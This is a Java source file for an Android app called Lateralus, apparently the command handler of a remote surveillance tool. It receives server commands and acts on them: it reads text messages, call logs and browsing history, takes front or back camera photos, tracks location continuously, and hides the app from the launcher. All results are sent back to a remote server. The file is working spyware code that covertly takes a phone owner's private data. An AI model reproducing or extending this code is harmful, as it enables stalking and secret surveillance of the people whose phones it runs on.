package xyz.lateralus.components;


import android.content.Context;
import android.location.Location;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import xyz.lateralus.components.camera.PhotoTaker;
import xyz.lateralus.components.camera.PhotoTakerListener;
import xyz.lateralus.components.location.LocDelegate;
import xyz.lateralus.components.location.LocationReader;
import xyz.lateralus.components.network.Network;
import xyz.lateralus.components.readers.DataReader;
import xyz.lateralus.components.readers.DeviceReader;
import xyz.lateralus.components.readers.InternetHistoryReader;
import xyz.lateralus.components.readers.PhonecallReader;
import xyz.lateralus.components.readers.TextMessageReader;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


public class LateralusMessageHandler {
    private static final String TAG = "LateralusMsgHandler";

    public static final String KEY_CMD       = "command";
    public static final String KEY_ROOT      = "json";
    public static final String KEY_PHOTO     = "photo";
    public static final String KEY_MSG       = "message";
    public static final String KEY_ERROR_MSG = "error_message";

    public static final String CMD_GET_TEXT_MESSAGES = "get_text_messages";
    public static final String CMD_GET_PHONECALLS    = "get_phonecalls";
    public static final String CMD_GET_INTERNET_HIST = "get_internet_history";
    public static final String CMD_TAKE_PIC_FRONT    = "take_picture_front";
    public static final String CMD_TAKE_PIC_BACK     = "take_picture_back";
    public static final String CMD_GET_LOCATION   = "get_location";
    public static final String CMD_START_TRACKING = "start_tracking";
    public static final String CMD_STOP_TRACKING  = "stop_tracking";

    public static final String CMD_SHOW_APP = "show_app";
    public static final String CMD_HIDE_APP = "hide_app";

    private Context _ctx;
    private static Handler _handler;

    private static LocationDelegate _locDelegate = null;
    private static LocationReader   _locReader = null;
    private static PhotoTaker       _picTaker = null;
    private static PhotoDelegate    _photoDelegate = null;

    public LateralusMessageHandler(Context ctx){
        _ctx = ctx;
        if(_handler == null){
            _handler = new Handler(Looper.getMainLooper());
        }
    }

    public void onMessageReceived(JSONObject data){
        try{
            String cmd = data.getString(KEY_CMD);
            switch(cmd){
                case CMD_GET_TEXT_MESSAGES:
                    cmdGetTextMessages();
                    break;
                case CMD_GET_PHONECALLS:
                    cmdGetPhonecalls();
                    break;
                case CMD_GET_INTERNET_HIST:
                    cmdGetInternetHistory();
                    break;
                case CMD_TAKE_PIC_FRONT:
                case CMD_TAKE_PIC_BACK:
                    cmdTakePicture(cmd);
                    break;
                case CMD_GET_LOCATION:
                case CMD_START_TRACKING:
                case CMD_STOP_TRACKING:
                    cmdLocation(cmd);
                    break;
                case CMD_HIDE_APP:
                case CMD_SHOW_APP:
                    cmdAppDrawer(cmd);
                    break;
                default:
                    Log.e(TAG, "Invalid Command: " + cmd);
                    sendLateralusErrorMessage(_ctx, "Invalid command from server: " + cmd);
            }
        }
        catch(JSONException e){
            Log.e(TAG, "JSON Error from GCM request");
            e.printStackTrace();
        }
    }

    /* -------- Commands -------- */

    private void cmdGetTextMessages(){
        try {
            JSONArray array = new JSONArray();
            DataReader dr = new DeviceReader(_ctx);
            array.put(dr.getData());
            dr = new TextMessageReader(_ctx);
            array.put(dr.getData());
            JSONObject root = new JSONObject().put(KEY_ROOT, array);
            Network.fireJsonData(Network.API_PUT, root);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdGetPhonecalls(){
        try{
            JSONArray array = new JSONArray();
            DataReader dr = new DeviceReader(_ctx);
            array.put(dr.getData());
            dr = new PhonecallReader(_ctx);
            array.put(dr.getData());
            JSONObject root = new JSONObject().put(KEY_ROOT, array);
            Network.fireJsonData(Network.API_PUT, root);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdGetInternetHistory(){
        try{
            JSONArray array = new JSONArray();
            DataReader dr = new DeviceReader(_ctx);
            array.put(dr.getData());
            dr = new InternetHistoryReader(_ctx);
            array.put(dr.getData());
            JSONObject root = new JSONObject().put(KEY_ROOT, array);
            Network.fireJsonData(Network.API_PUT, root);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdAppDrawer(final String cmd){
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(cmd.equals(CMD_SHOW_APP)){
                    Utils.showAppInDrawer(_ctx);
                }
                else{
                    Utils.hideAppInDrawer(_ctx);
                }
            }
        });
    }

    private void cmdTakePicture(final String cmd){
        if(_photoDelegate == null){
            _photoDelegate = new PhotoDelegate();
        }
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(_picTaker == null) {
                    _picTaker = new PhotoTaker(_ctx, _photoDelegate);
                }
                _picTaker.takePhoto((cmd.equals(CMD_TAKE_PIC_FRONT)) ? PhotoTaker.FRONT : PhotoTaker.BACK);
            }
        });
    }

    private void cmdLocation(final String cmd){
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(_locDelegate == null || _locReader == null){
                    _locDelegate = new LocationDelegate();
                    _locReader = new LocationReader(_ctx, _locDelegate);
                }
                switch(cmd){
                    case CMD_GET_LOCATION:
                        _locReader.requestSingleLocationUpdate();
                        break;
                    case CMD_START_TRACKING:
                        _locReader.startTracking();
                        break;
                    case CMD_STOP_TRACKING:
                        _locReader.stopTracking();
                        _locDelegate = null;
                        _locReader = null;
                        break;
                }
            }
        });
    }

    /* -------- Send Messages -------- */

    public static void sendLateralusMessage(Context ctx, String msg){
        try{
            JSONArray jsonArray = new JSONArray();
            DeviceReader dr = new DeviceReader(ctx);
            jsonArray.put(dr.getData());
            jsonArray.put(new JSONObject().put(KEY_MSG, msg));
            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
            Network.fireJsonData(Network.API_PUT, root);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    public static void sendLateralusErrorMessage(Context ctx, String msg){
        try{
            JSONArray jsonArray = new JSONArray();
            DeviceReader dr = new DeviceReader(ctx);
            jsonArray.put(dr.getData());
            jsonArray.put(new JSONObject().put(KEY_ERROR_MSG, msg));
            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
            Network.fireJsonData(Network.API_PUT, root);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    /* --------- Location Delegate -------- */

    private class LocationDelegate implements LocDelegate {

        @Override
        public void onLocationReceived(Location loc) {
            try {
                JSONObject jsonLoc = LocationReader.getJsonFromLocation(loc);
                if(jsonLoc != null) {
                    JSONArray jsonArray = new JSONArray();
                    DeviceReader dr = new DeviceReader(_ctx);
                    jsonArray.put(dr.getData());
                    jsonArray.put(jsonLoc);
                    JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                    Network.fireJsonData(Network.API_PUT, root);
                }
            }
            catch(Exception e){
                Log.e(TAG, "JSON Error");
                e.printStackTrace();
            }
        }

        @Override
        public void onErrorReceived(String msg) {
            sendLateralusErrorMessage(_ctx, msg);
        }

        @Override
        public void onMessageReceived(String msg) {
            sendLateralusMessage(_ctx, msg);
        }
    }

    /* ------- Photo Taker Delegate -------- */

    private class PhotoDelegate implements PhotoTakerListener{

        @Override
        public void onPhotoTaken(byte[] photoBytes) {
            try {
                String photoStr = Base64.encodeToString(photoBytes, Base64.NO_WRAP);
                JSONArray jsonArray = new JSONArray();
                DeviceReader dr = new DeviceReader(_ctx);
                jsonArray.put(dr.getData());
                jsonArray.put(new JSONObject().put(KEY_PHOTO, photoStr));
                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                Network.fireJsonData(Network.API_PUT, root);
            }
            catch(Exception e){
                Log.e(TAG, "JSON Error");
                e.printStackTrace();
            }
        }

        @Override
        public void onError(String msg) {
            sendLateralusErrorMessage(_ctx, msg);
        }
    }

}
